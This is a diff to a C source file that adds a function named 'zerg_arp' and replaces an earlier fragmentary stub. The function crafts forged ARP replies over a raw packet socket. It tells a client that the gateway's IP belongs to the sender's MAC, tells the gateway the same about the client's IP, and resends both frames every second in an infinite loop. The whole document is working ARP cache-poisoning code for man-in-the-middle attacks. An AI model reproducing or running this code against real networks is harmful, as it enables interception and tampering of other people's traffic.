@@ -1,14 +1,119 @@
+#define _DEFAULT_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/filter.h>
+#include <linux/if.h>
+#include <linux/if_ether.h>
+#include <linux/if_packet.h>
+#include <linux/ip.h>
+#include <linux/udp.h>
+#include <net/ethernet.h>
+#include <net/if_arp.h>
+#include <netdb.h>
+#include <netinet/ether.h>
+#include <netinet/if_ether.h>
+#include <netinet/in.h>
+#include <pthread.h>
+#include <stddef.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/param.h>
+#include <sys/raw.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <unistd.h>
+
 #include "poison.h"
-#include <
 
+void* zerg_arp(void* targets) {
+    //copy it local
+    targets_t t = *(targets_t*)targets;
 
-void forge_arp_reply(uint8_t *buffer, uint32_t ip, uint8_t mac[6]) {
-    socket_address.sll_family   = PF_PACKET;
-    socket_address.sll_protocol = htons(ETH_P_ARP);
-    socket_address.sll_ifindex  = ifindex;
-    socket_address.sll_hatype   = ARPHRD_ETHER;
-    socket_address.sll_pkttype  = 0; //PACKET_OTHERHOST;
-    socket_address.sll_halen    = 0;
-    socket_address.sll_addr[6]  = 0x00;
-    socket_address.sll_addr[7]  = 0x00;
+    static uint8_t cbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+    static uint8_t gbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+
+    memset(cbuf, 0, sizeof(struct ether_header) + sizeof(struct ether_arp));
+    memset(gbuf, 0, sizeof(struct ether_header) + sizeof(struct ether_arp));
+
+    struct ether_header* ceh = (struct ether_header*)cbuf;
+    struct ether_header* geh = (struct ether_header*)gbuf;
+
+    struct ether_arp* cea = (struct ether_arp*)(cbuf + sizeof(struct ether_header));
+    struct ether_arp* gea = (struct ether_arp*)(gbuf + sizeof(struct ether_header));
+
+    //set target mac address
+    memcpy(ceh->ether_dhost, t.cmac, 6);
+    memcpy(geh->ether_dhost, t.gmac, 6);
+
+    //set sender mac address
+    memcpy(ceh->ether_shost, t.omac, 6);
+    memcpy(geh->ether_shost, t.omac, 6);
+
+    ceh->ether_type = htons(ETH_P_ARP);
+    geh->ether_type = htons(ETH_P_ARP);
+
+    //ethernet
+    cea->arp_hrd = htons(ARPHRD_ETHER);
+    gea->arp_hrd = htons(ARPHRD_ETHER);
+    //ipv4
+    cea->arp_pro = htons(ETH_P_IP);
+    gea->arp_pro = htons(ETH_P_IP);
+    //hardware len
+    cea->arp_hln = ETHER_ADDR_LEN;
+    gea->arp_hln = ETHER_ADDR_LEN;
+    //protocol len
+    cea->arp_pln = sizeof(in_addr_t);
+    gea->arp_pln = sizeof(in_addr_t);
+
+    //arp reply
+    cea->arp_op = htons(ARPOP_REPLY);
+    gea->arp_op = htons(ARPOP_REPLY);
+
+    //set sender mac address
+    memcpy(cea->arp_sha, t.omac, 6);
+    memcpy(gea->arp_sha, t.omac, 6);
+
+    //set sender ip address
+    //memcpy(cea->arp_spa, (victim_ip == gateway_ip) ? &target_ip : &gateway_ip, 4);
+    memcpy(cea->arp_spa, &t.gip, 4);
+    memcpy(gea->arp_spa, &t.cip, 4);
+
+    //set target mac address
+    memcpy(cea->arp_tha, t.cmac, 6);
+    memcpy(gea->arp_tha, t.gmac, 6);
+
+    //set target ip address
+    memcpy(cea->arp_tpa, &t.cip, 4);
+    memcpy(gea->arp_tpa, &t.gip, 4);
+
+    struct sockaddr_ll caddr = {0};
+    struct sockaddr_ll gaddr = {0};
+
+    caddr.sll_family   = AF_PACKET;
+    caddr.sll_ifindex  = IF_INDEX;
+    caddr.sll_halen    = ETHER_ADDR_LEN;
+    caddr.sll_protocol = htons(ETH_P_ARP);
+
+    gaddr.sll_family   = AF_PACKET;
+    gaddr.sll_ifindex  = IF_INDEX;
+    gaddr.sll_halen    = ETHER_ADDR_LEN;
+    gaddr.sll_protocol = htons(ETH_P_ARP);
+
+    memcpy(caddr.sll_addr, t.cmac, ETHER_ADDR_LEN);
+    memcpy(gaddr.sll_addr, t.gmac, ETHER_ADDR_LEN);
+
+    for (;;) {
+        //hit the client
+        sendto(t.sock, cbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
+            (struct sockaddr*)&caddr, sizeof(struct sockaddr_ll));
+        //hit the gateway
+        sendto(t.sock, gbuf, sizeof(struct ether_header) + sizeof(struct ether_arp), 0,
+            (struct sockaddr*)&gaddr, sizeof(struct sockaddr_ll));
+        sleep(1);
+    }
+
+    return NULL;
 }
